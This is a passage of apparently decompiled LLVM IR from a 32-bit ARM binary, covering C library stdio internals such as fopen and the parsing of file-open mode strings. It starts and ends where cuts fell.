  br i1 %v9_160c0, label %dec_label_pc_160c8, label %dec_label_pc_160c0.dec_label_pc_16090_crit_edge

dec_label_pc_160c0.dec_label_pc_16090_crit_edge:  ; preds = %dec_label_pc_160c0
  %v0_16090.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16090

dec_label_pc_160c8:                               ; preds = %dec_label_pc_160c0
  %v2_160c8 = icmp ne i32 %v1_160c0, 0
  store i1 %v2_160c8, i1* %cpsr_c.global-to-local, align 1
  %v7_160cc = icmp slt i32 %v1_160c0, 2
  br i1 %v7_160cc, label %dec_label_pc_160e8, label %dec_label_pc_160d0

dec_label_pc_160d0:                               ; preds = %dec_label_pc_160c8
  %v0_160d0 = load i32, i32* @r7, align 4
  store i32 %v0_160d0, i32* %r0.global-to-local, align 4
  %v0_160d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_160d4 = add i32 %v0_160d4, 129
  store i32 %v1_160d4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_160e8

dec_label_pc_160e8:                               ; preds = %dec_label_pc_16060, %dec_label_pc_160d0, %dec_label_pc_160c8
  %v0_160e8 = load i32, i32* @r5, align 4
  %v1_160e8 = inttoptr i32 %v0_160e8 to i16*
  %v2_160e8 = load i16, i16* %v1_160e8, align 2
  %v3_160e8 = zext i16 %v2_160e8 to i32
  %v1_160ec = and i32 %v3_160e8, 24576
  %v1_160f0 = or i32 %v1_160ec, 48
  store i32 %v1_160f0, i32* %r3.global-to-local, align 4
  %v0_160f4 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_160f4 = icmp eq i32 %v0_160f4, 0
  %v1_160f8 = trunc i32 %v1_160f0 to i16
  store i16 %v1_160f8, i16* %v1_160e8, align 2
  br i1 %v2_160f4, label %dec_label_pc_16100, label %dec_label_pc_16174

dec_label_pc_16100:                               ; preds = %dec_label_pc_160e8
  %v0_16100 = load i32, i32* @r5, align 4
  %v1_16100 = add i32 %v0_16100, 60
  %v2_16100 = inttoptr i32 %v1_16100 to i32*
  %v3_16100 = load i32, i32* %v2_16100, align 4
  %v1_16104 = add i32 %v3_16100, -1
  store i32 %v1_16104, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16108 = icmp eq i32 %v1_16104, 0
  store i32 %v1_16104, i32* %v2_16100, align 4
  br i1 %v2_16108, label %dec_label_pc_16114, label %dec_label_pc_16174

dec_label_pc_16114:                               ; preds = %dec_label_pc_16100
  %v0_16114 = load i32, i32* %r3.global-to-local, align 4
  %v1_16114 = load i32, i32* @r5, align 4
  %v2_16114 = add i32 %v1_16114, 64
  %v3_16114 = inttoptr i32 %v2_16114 to i32*
  store i32 %v0_16114, i32* %v3_16114, align 4
  %v0_16118 = load i32, i32* @r5, align 4
  %v1_16118 = add i32 %v0_16118, 56
  store i32 %v1_16118, i32* @r6, align 4
  br label %dec_label_pc_1611c

dec_label_pc_1611c:                               ; preds = %dec_label_pc_1614c.dec_label_pc_1611c_crit_edge, %dec_label_pc_16114
  %v0_16124 = phi i32 [ %v0_16124.pre, %dec_label_pc_1614c.dec_label_pc_1611c_crit_edge ], [ %v1_16118, %dec_label_pc_16114 ]
  %v0_1611c = phi i32 [ %v0_1611c.pre, %dec_label_pc_1614c.dec_label_pc_1611c_crit_edge ], [ %v0_16118, %dec_label_pc_16114 ]
  %v1_1611c = add i32 %v0_1611c, 56
  %v2_1611c = inttoptr i32 %v1_1611c to i32*
  %v3_1611c = load i32, i32* %v2_1611c, align 4
  store i32 %v3_1611c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16124, i32* %r2.global-to-local, align 4
  %v1_1612882 = inttoptr i32 %v0_16124 to i32*
  %v2_1612883 = load i32, i32* %v1_1612882, align 4
  store i32 %v2_1612883, i32* %r3.global-to-local, align 4
  %v3_1612c85 = icmp uge i32 %v2_1612883, %v3_1611c
  store i1 %v3_1612c85, i1* %cpsr_c.global-to-local, align 1
  %v9_1612c91 = icmp eq i32 %v2_1612883, %v3_1611c
  br i1 %v9_1612c91, label %dec_label_pc_16134, label %dec_label_pc_1614c

dec_label_pc_16134:                               ; preds = %dec_label_pc_1611c, %dec_label_pc_16134.dec_label_pc_16128_crit_edge
  %v0_1613492 = phi i32 [ %v1_1612c.pre, %dec_label_pc_16134.dec_label_pc_16128_crit_edge ], [ %v3_1611c, %dec_label_pc_1611c ]
  store i32 %v0_1613492, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16144 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16144, label %dec_label_pc_16148, label %dec_label_pc_16134.dec_label_pc_16128_crit_edge

dec_label_pc_16134.dec_label_pc_16128_crit_edge:  ; preds = %dec_label_pc_16134
  %v0_16128.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1612c.pre = load i32, i32* @r4, align 4
  %v1_16128 = inttoptr i32 %v0_16128.pre to i32*
  %v2_16128 = load i32, i32* %v1_16128, align 4
  store i32 %v2_16128, i32* %r3.global-to-local, align 4
  %v3_1612c = icmp uge i32 %v2_16128, %v1_1612c.pre
  store i1 %v3_1612c, i1* %cpsr_c.global-to-local, align 1
  %v9_1612c = icmp eq i32 %v2_16128, %v1_1612c.pre
  br i1 %v9_1612c, label %dec_label_pc_16134, label %dec_label_pc_1614c

dec_label_pc_16148:                               ; preds = %dec_label_pc_16134
  %v0_16148 = load i32, i32* @r4, align 4
  store i32 %v0_16148, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1614c

dec_label_pc_1614c:                               ; preds = %dec_label_pc_1611c, %dec_label_pc_16134.dec_label_pc_16128_crit_edge, %dec_label_pc_16148
  %v0_16154 = phi i32 [ %v0_16148, %dec_label_pc_16148 ], [ %v2_1612883, %dec_label_pc_1611c ], [ %v2_16128, %dec_label_pc_16134.dec_label_pc_16128_crit_edge ]
  %v1_1614c = phi i32 [ %v0_16148, %dec_label_pc_16148 ], [ %v3_1611c, %dec_label_pc_1611c ], [ %v1_1612c.pre, %dec_label_pc_16134.dec_label_pc_16128_crit_edge ]
  %v3_1614c = icmp uge i32 %v0_16154, %v1_1614c
  store i1 %v3_1614c, i1* %cpsr_c.global-to-local, align 1
  %v9_1614c = icmp eq i32 %v0_16154, %v1_1614c
  br i1 %v9_1614c, label %dec_label_pc_16154, label %dec_label_pc_1614c.dec_label_pc_1611c_crit_edge

dec_label_pc_1614c.dec_label_pc_1611c_crit_edge:  ; preds = %dec_label_pc_1614c
  %v0_1611c.pre = load i32, i32* @r5, align 4
  %v0_16124.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1611c

dec_label_pc_16154:                               ; preds = %dec_label_pc_1614c
  %v2_16154 = icmp ne i32 %v1_1614c, 0
  store i1 %v2_16154, i1* %cpsr_c.global-to-local, align 1
  %v7_16158 = icmp slt i32 %v1_1614c, 2
  br i1 %v7_16158, label %dec_label_pc_16174, label %dec_label_pc_1615c

dec_label_pc_1615c:                               ; preds = %dec_label_pc_16154
  %v0_1615c = load i32, i32* @r5, align 4
  %v1_1615c = add i32 %v0_1615c, 56
  store i32 %v1_1615c, i32* %r0.global-to-local, align 4
  %v0_16160 = load i32, i32* %r1.global-to-local, align 4
  %v1_16160 = add i32 %v0_16160, 129
  store i32 %v1_16160, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16174

dec_label_pc_16174:                               ; preds = %dec_label_pc_16100, %dec_label_pc_160e8, %dec_label_pc_1615c, %dec_label_pc_16154
  %v0_16174 = load i32, i32* @r5, align 4
  %v1_16174 = inttoptr i32 %v0_16174 to i16*
  %v2_16174 = load i16, i16* %v1_16174, align 2
  %v3_16174 = zext i16 %v2_16174 to i32
  store i32 %v3_16174, i32* %r3.global-to-local, align 4
  %v1_16178 = and i32 %v3_16174, 16384
  %v2_16178 = icmp eq i32 %v1_16178, 0
  br i1 %v2_16178, label %bb49, label %bb48

bb48:                                             ; preds = %dec_label_pc_16174
  %v2_1617c = add i32 %v0_16174, 8
  %v3_1617c = inttoptr i32 %v2_1617c to i32*
  %v4_1617c = load i32, i32* %v3_1617c, align 4
  store i32 %v4_1617c, i32* %r0.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_16174, %bb48
  %v1_16180 = xor i1 %v2_16178, true
  call void @__pseudo_cond_branch(i1 %v1_16180, i32 ptrtoint (i32* @global_var_135cc.33 to i32))
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16188 = load i32, i32* @r8, align 4
  %v2_16188 = add i32 %v0_16188, 160
  %v3_16188 = inttoptr i32 %v2_16188 to i32*
  %v4_16188 = load i32, i32* %v3_16188, align 4
  store i32 %v4_16188, i32* @r5, align 4
  %v1_1618c = add i32 %v4_16188, 8
  %v2_1618c = inttoptr i32 %v1_1618c to i32*
  %v3_1618c = load i32, i32* %v2_1618c, align 4
  store i32 %v3_1618c, i32* %r3.global-to-local, align 4
  %v1_16190 = load i32, i32* %sl.global-to-local, align 4
  %v3_16190 = icmp uge i32 %v3_1618c, %v1_16190
  store i1 %v3_16190, i1* %cpsr_c.global-to-local, align 1
  %v9_16190 = icmp eq i32 %v3_1618c, %v1_16190
  br i1 %v9_16190, label %dec_label_pc_161d8, label %dec_label_pc_16198

dec_label_pc_16198:                               ; preds = %bb49
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16188, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_161a475 = inttoptr i32 %v4_16188 to i32*
  %v2_161a476 = load i32, i32* %v1_161a475, align 4
  store i32 %v2_161a476, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_161a878 = icmp eq i32 %v2_161a476, 0
  br i1 %v9_161a878, label %dec_label_pc_161b0, label %dec_label_pc_161c8

dec_label_pc_161b0:                               ; preds = %dec_label_pc_16198, %dec_label_pc_161b0.dec_label_pc_161a4_crit_edge
  %v0_161b079 = phi i32 [ %v1_161a8.pre, %dec_label_pc_161b0.dec_label_pc_161a4_crit_edge ], [ 0, %dec_label_pc_16198 ]
  store i32 %v0_161b079, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_161c0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_161c0, label %dec_label_pc_161c4, label %dec_label_pc_161b0.dec_label_pc_161a4_crit_edge

dec_label_pc_161b0.dec_label_pc_161a4_crit_edge:  ; preds = %dec_label_pc_161b0
  %v0_161a4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_161a8.pre = load i32, i32* @r4, align 4
  %v1_161a4 = inttoptr i32 %v0_161a4.pre to i32*
  %v2_161a4 = load i32, i32* %v1_161a4, align 4
  store i32 %v2_161a4, i32* %r3.global-to-local, align 4
  %v3_161a8 = icmp uge i32 %v2_161a4, %v1_161a8.pre
  store i1 %v3_161a8, i1* %cpsr_c.global-to-local, align 1
  %v9_161a8 = icmp eq i32 %v2_161a4, %v1_161a8.pre
  br i1 %v9_161a8, label %dec_label_pc_161b0, label %dec_label_pc_161c8

dec_label_pc_161c4:                               ; preds = %dec_label_pc_161b0
  %v0_161c4 = load i32, i32* @r4, align 4
  store i32 %v0_161c4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_161c8

dec_label_pc_161c8:                               ; preds = %dec_label_pc_16198, %dec_label_pc_161b0.dec_label_pc_161a4_crit_edge, %dec_label_pc_161c4
  %v0_161c8 = phi i32 [ %v0_161c4, %dec_label_pc_161c4 ], [ %v2_161a476, %dec_label_pc_16198 ], [ %v2_161a4, %dec_label_pc_161b0.dec_label_pc_161a4_crit_edge ]
  %v1_161c8 = phi i32 [ %v0_161c4, %dec_label_pc_161c4 ], [ 0, %dec_label_pc_16198 ], [ %v1_161a8.pre, %dec_label_pc_161b0.dec_label_pc_161a4_crit_edge ]
  %v3_161c8 = icmp uge i32 %v0_161c8, %v1_161c8
  store i1 %v3_161c8, i1* %cpsr_c.global-to-local, align 1
  %v9_161c8 = icmp eq i32 %v0_161c8, %v1_161c8
  br i1 %v9_161c8, label %bb51, label %bb50

bb50:                                             ; preds = %dec_label_pc_161c8
  %v1_161cc = load i32, i32* @r5, align 4
  store i32 %v1_161cc, i32* %r0.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_161c8, %bb50
  %v1_161d0 = xor i1 %v9_161c8, true
  call void @__pseudo_cond_branch(i1 %v1_161d0, i32 ptrtoint (i32* @global_var_14784.527 to i32))
  %v0_161d4 = load i32, i32* %sl.global-to-local, align 4
  %v1_161d4 = load i32, i32* @r5, align 4
  %v2_161d4 = add i32 %v1_161d4, 8
  %v3_161d4 = inttoptr i32 %v2_161d4 to i32*
  store i32 %v0_161d4, i32* %v3_161d4, align 4
  %v0_161dc.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_161d8

dec_label_pc_161d8:                               ; preds = %bb49, %bb51
  %v0_161dc = phi i32 [ %v0_16188, %bb49 ], [ %v0_161dc.pre, %bb51 ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_161dc = add i32 %v0_161dc, 80
  %v3_161dc = inttoptr i32 %v2_161dc to i32*
  %v4_161dc = load i32, i32* %v3_161dc, align 4
  store i32 %v4_161dc, i32* %r2.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_161e4 = add i32 %v0_161dc, 160
  %v3_161e4 = inttoptr i32 %v2_161e4 to i32*
  %v4_161e4 = load i32, i32* %v3_161e4, align 4
  store i32 %v4_161e4, i32* %r0.global-to-local, align 4
  %v1_161e8 = inttoptr i32 %v4_161dc to i32*
  %v2_161e8 = load i32, i32* %v1_161e8, align 4
  store i32 %v2_161e8, i32* %r3.global-to-local, align 4
  %v1_161ec = add i32 %v4_161e4, 4
  %v2_161ec = inttoptr i32 %v1_161ec to i32*
  %v3_161ec = load i32, i32* %v2_161ec, align 4
  store i32 %v3_161ec, i32* %r1.global-to-local, align 4
  %v1_161f0 = add i32 %v2_161e8, 1
  store i32 %v1_161f0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_161f4 = icmp eq i32 %v3_161ec, 0
  store i32 %v1_161f0, i32* %v1_161e8, align 4
  br i1 %v2_161f4, label %dec_label_pc_16200, label %dec_label_pc_16260

dec_label_pc_16200:                               ; preds = %dec_label_pc_161d8
  %v0_16200 = load i32, i32* %r1.global-to-local, align 4
  %v1_16200 = load i32, i32* %r0.global-to-local, align 4
  %v2_16200 = add i32 %v1_16200, 8
  %v3_16200 = inttoptr i32 %v2_16200 to i32*
  store i32 %v0_16200, i32* %v3_16200, align 4
  %v0_16204 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16204, i32* @r5, align 4
  br label %dec_label_pc_16208

dec_label_pc_16208:                               ; preds = %dec_label_pc_16238.dec_label_pc_16208_crit_edge, %dec_label_pc_16200
  %v0_16208 = phi i32 [ %v0_16208.pre, %dec_label_pc_16238.dec_label_pc_16208_crit_edge ], [ %v0_16204, %dec_label_pc_16200 ]
  %v1_16208 = inttoptr i32 %v0_16208 to i32*
  %v2_16208 = load i32, i32* %v1_16208, align 4
  store i32 %v2_16208, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16208, i32* %r2.global-to-local, align 4
  %v2_1621464 = load i32, i32* %v1_16208, align 4
  store i32 %v2_1621464, i32* %r3.global-to-local, align 4
  %v3_1621866 = icmp uge i32 %v2_1621464, %v2_16208
  store i1 %v3_1621866, i1* %cpsr_c.global-to-local, align 1
  %v9_1621872 = icmp eq i32 %v2_1621464, %v2_16208
  br i1 %v9_1621872, label %dec_label_pc_16220, label %dec_label_pc_16238

dec_label_pc_16220:                               ; preds = %dec_label_pc_16208, %dec_label_pc_16220.dec_label_pc_16214_crit_edge
  %v0_1622073 = phi i32 [ %v1_16218.pre, %dec_label_pc_16220.dec_label_pc_16214_crit_edge ], [ %v2_16208, %dec_label_pc_16208 ]
  store i32 %v0_1622073, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16230 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16230, label %dec_label_pc_16234, label %dec_label_pc_16220.dec_label_pc_16214_crit_edge

dec_label_pc_16220.dec_label_pc_16214_crit_edge:  ; preds = %dec_label_pc_16220
  %v0_16214.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16218.pre = load i32, i32* @r4, align 4
  %v1_16214 = inttoptr i32 %v0_16214.pre to i32*
  %v2_16214 = load i32, i32* %v1_16214, align 4
  store i32 %v2_16214, i32* %r3.global-to-local, align 4
  %v3_16218 = icmp uge i32 %v2_16214, %v1_16218.pre
  store i1 %v3_16218, i1* %cpsr_c.global-to-local, align 1
  %v9_16218 = icmp eq i32 %v2_16214, %v1_16218.pre
  br i1 %v9_16218, label %dec_label_pc_16220, label %dec_label_pc_16238

dec_label_pc_16234:                               ; preds = %dec_label_pc_16220
  %v0_16234 = load i32, i32* @r4, align 4
  store i32 %v0_16234, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16238

dec_label_pc_16238:                               ; preds = %dec_label_pc_16208, %dec_label_pc_16220.dec_label_pc_16214_crit_edge, %dec_label_pc_16234
  %v0_16240 = phi i32 [ %v0_16234, %dec_label_pc_16234 ], [ %v2_1621464, %dec_label_pc_16208 ], [ %v2_16214, %dec_label_pc_16220.dec_label_pc_16214_crit_edge ]
  %v1_16238 = phi i32 [ %v0_16234, %dec_label_pc_16234 ], [ %v2_16208, %dec_label_pc_16208 ], [ %v1_16218.pre, %dec_label_pc_16220.dec_label_pc_16214_crit_edge ]
  %v3_16238 = icmp uge i32 %v0_16240, %v1_16238
  store i1 %v3_16238, i1* %cpsr_c.global-to-local, align 1
  %v9_16238 = icmp eq i32 %v0_16240, %v1_16238
  br i1 %v9_16238, label %dec_label_pc_16240, label %dec_label_pc_16238.dec_label_pc_16208_crit_edge

dec_label_pc_16238.dec_label_pc_16208_crit_edge:  ; preds = %dec_label_pc_16238
  %v0_16208.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16208

dec_label_pc_16240:                               ; preds = %dec_label_pc_16238
  %v2_16240 = icmp ne i32 %v1_16238, 0
  store i1 %v2_16240, i1* %cpsr_c.global-to-local, align 1
  %v7_16244 = icmp slt i32 %v1_16238, 2
  br i1 %v7_16244, label %dec_label_pc_16260, label %dec_label_pc_16248

dec_label_pc_16248:                               ; preds = %dec_label_pc_16240
  %v0_16248 = load i32, i32* @r5, align 4
  store i32 %v0_16248, i32* %r0.global-to-local, align 4
  %v0_1624c = load i32, i32* %r1.global-to-local, align 4
  %v1_1624c = add i32 %v0_1624c, 129
  store i32 %v1_1624c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16260

dec_label_pc_16260:                               ; preds = %dec_label_pc_161d8, %dec_label_pc_16248, %dec_label_pc_16240
  %v0_16260 = call i32 @_stdio_openlist_dec_use()
  %v0_16264 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_16264, i32* %r0.global-to-local, align 4
  %v2_1626c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1626c, i32* @r4, align 4
  store i32 %v6_15f54, i32* @r5, align 4
  store i32 %v9_15f54, i32* @r6, align 4
  store i32 %v12_15f54, i32* @r7, align 4
  ret i32 %v0_16264

; uselistorder directives
  uselistorder i32 %v0_16234, { 1, 0, 2 }
  uselistorder i32 %v1_16218.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16208, { 1, 0 }
  uselistorder i32 %v0_161dc, { 1, 0 }
  uselistorder i32 %v0_161c4, { 1, 0, 2 }
  uselistorder i32 %v1_161a8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16190, { 1, 0 }
  uselistorder i32 %v0_16148, { 1, 0, 2 }
  uselistorder i32 %v1_1612c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_160bc, { 1, 0, 2 }
  uselistorder i32 %v1_160a0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16090, { 1, 0 }
  uselistorder i32 %v0_1604c, { 1, 0, 2 }
  uselistorder i32 %v1_16030.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16010, { 1, 0 }
  uselistorder i32 %v1_15f9c.pre, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 0, 5, 6, 7, 8, 9, 11, 10, 46, 12, 15, 13, 14, 16, 18, 17, 45, 19, 20, 21, 22, 23, 25, 24, 42, 26, 27, 28, 29, 31, 30, 43, 32, 33, 34, 35, 36, 37, 38, 40, 39, 44, 41 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 21, 22, 0, 23, 24, 26, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 30, 31, 4, 5, 6, 34, 35, 7, 8, 9, 10, 32, 33, 11, 12, 13, 14, 16, 15, 0, 17, 18, 19, 26, 27, 20, 21, 22, 23, 28, 29, 24, 25 }
  uselistorder i32 (i32)* @__GI___libc_close, { 29, 27, 26, 33, 32, 25, 31, 30, 24, 2, 28, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder label %dec_label_pc_16260, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16238, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16220, { 1, 0 }
  uselistorder label %dec_label_pc_161d8, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_161c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_161b0, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_16174, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1614c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16134, { 1, 0 }
  uselistorder label %dec_label_pc_160e8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_160c0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_160a8, { 1, 0 }
  uselistorder label %dec_label_pc_16060, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_16050, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16038, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_15fd8, { 1, 0 }
  uselistorder label %dec_label_pc_15fcc, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_15fbc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15fa4, { 1, 0 }
}

define i32 @function_16278(i32 %arg1) local_unnamed_addr {
dec_label_pc_16278:
  %v0_16278 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16278, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_16278
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_16278, %bb
  %v10_16280 = phi i32 [ %arg1, %dec_label_pc_16278 ], [ 0, %bb ]
  ret i32 %v10_16280

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_fopen() local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_16294 = call i32 @_stdio_fopen()
  ret i32 %v0_16294
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_162a4 = load i32, i32* @r4, align 4
  store i32 %v3_162a4, i32* %stack_var_-24, align 4
  %v6_162a4 = load i32, i32* @r5, align 4
  %v9_162a4 = load i32, i32* @r6, align 4
  %v12_162a4 = load i32, i32* @r7, align 4
  %v15_162a4 = load i32, i32* @r8, align 4
  %v0_162a8 = load i32, i32* @r1, align 4
  %v1_162a8 = inttoptr i32 %v0_162a8 to i8*
  %v2_162a8 = load i8, i8* %v1_162a8, align 1
  %v2_162b0 = icmp ugt i8 %v2_162a8, 113
  store i1 %v2_162b0, i1* %cpsr_c.global-to-local, align 1
  %v7_162b0 = icmp eq i8 %v2_162a8, 114
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* @r8, align 4
  %v0_162bc = load i32, i32* @r0, align 4
  store i32 %v0_162bc, i32* @r7, align 4
  %v0_162c0 = load i32, i32* @r2, align 4
  store i32 %v0_162c0, i32* @r5, align 4
  %v0_162c4 = load i32, i32* @r3, align 4
  store i32 %v0_162c4, i32* @r6, align 4
  br i1 %v7_162b0, label %dec_label_pc_16318, label %dec_label_pc_162cc

dec_label_pc_162cc:                               ; preds = %entry
  %v2_162cc = icmp ugt i8 %v2_162a8, 118
  store i1 %v2_162cc, i1* %cpsr_c.global-to-local, align 1
  %v7_162cc = icmp eq i8 %v2_162a8, 119
  br i1 %v7_162cc, label %bb, label %dec_label_pc_162d8

bb:                                               ; preds = %dec_label_pc_162cc
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_1631c

dec_label_pc_162d8:                               ; preds = %dec_label_pc_162cc
  %v2_162d8 = icmp ugt i8 %v2_162a8, 96
  store i1 %v2_162d8, i1* %cpsr_c.global-to-local, align 1
  %v7_162d8 = icmp eq i8 %v2_162a8, 97
  br i1 %v7_162d8, label %bb49, label %dec_label_pc_162e4

bb49:                                             ; preds = %dec_label_pc_162d8
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_1631c

dec_label_pc_162e4:                               ; preds = %dec_label_pc_162d8, %dec_label_pc_163b4, %dec_label_pc_16388
  store i32 49064, i32* %r2.global-to-local, align 4
  %v0_162e8 = call i32 @__aeabi_read_tp()
  store i32 %v0_162e8, i32* %r0.global-to-local, align 4
  %v3_162ec = load i16, i16* @global_var_2229c.359, align 2
  %v4_162ec = sext i16 %v3_162ec to i32
  store i32 %v4_162ec, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_162f4 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_162f4 = icmp eq i32 %v0_162f4, 0
  %v3_162f8 = add i32 %v4_162ec, %v0_162e8
  %v4_162f8 = inttoptr i32 %v3_162f8 to i32*
  store i32 22, i32* %v4_162f8, align 4
  br i1 %v2_162f4, label %dec_label_pc_166bc, label %dec_label_pc_16300

dec_label_pc_16300:                               ; preds = %dec_label_pc_163d8._crit_edge, %dec_label_pc_162e4
  %v0_16300 = load i32, i32* @r5, align 4
  %v1_16300 = inttoptr i32 %v0_16300 to i16*
  %v2_16300 = load i16, i16* %v1_16300, align 2
  %v3_16300 = zext i16 %v2_16300 to i32
  store i32 %v3_16300, i32* %r3.global-to-local, align 4
  %v1_16304 = and i32 %v3_16300, 8192
  %v2_16304 = icmp eq i32 %v1_16304, 0
  br i1 %v2_16304, label %dec_label_pc_166bc, label %dec_label_pc_1630c

dec_label_pc_1630c:                               ; preds = %dec_label_pc_16300
  store i32 %v0_16300, i32* @r0, align 4
  %v0_16310 = call i32 @free()
  store i32 %v0_16310, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_166bc

dec_label_pc_16318:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1631c

dec_label_pc_1631c:                               ; preds = %bb, %bb49, %dec_label_pc_16318
  %v1_16334 = phi i32 [ 1089, %bb49 ], [ 577, %bb ], [ 1, %dec_label_pc_16318 ]
  %v1_1631c = add i32 %v0_162a8, 1
  %v2_1631c = inttoptr i32 %v1_1631c to i8*
  %v3_1631c = load i8, i8* %v2_1631c, align 1
  %v2_16320 = icmp ugt i8 %v3_1631c, 97
  store i1 %v2_16320, i1* %cpsr_c.global-to-local, align 1
  %v7_16320 = icmp eq i8 %v3_1631c, 98
  %v1_1631c.v0_162a8 = select i1 %v7_16320, i32 %v1_1631c, i32 %v0_162a8
  store i32 %v1_1631c.v0_162a8, i32* %r3.global-to-local, align 4
  %v1_1632c = add i32 %v1_1631c.v0_162a8, 1
  %v2_1632c = inttoptr i32 %v1_1632c to i8*
  %v3_1632c = load i8, i8* %v2_1632c, align 1
  %v4_1632c = zext i8 %v3_1632c to i32
  store i32 %v4_1632c, i32* @r3, align 4
  %v2_16330 = icmp ugt i8 %v3_1632c, 42
  store i1 %v2_16330, i1* %cpsr_c.global-to-local, align 1
  %v7_16330 = icmp eq i8 %v3_1632c, 43
  br i1 %v7_16330, label %bb52, label %.thread3

bb52:                                             ; preds = %dec_label_pc_1631c
  store i32 %v1_16334, i32* @r3, align 4
  %v2_16338 = add nuw nsw i32 %v1_16334, 1
  store i32 %v2_16338, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1631c, %bb52
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1633c = icmp eq i32 %v0_162c0, 0
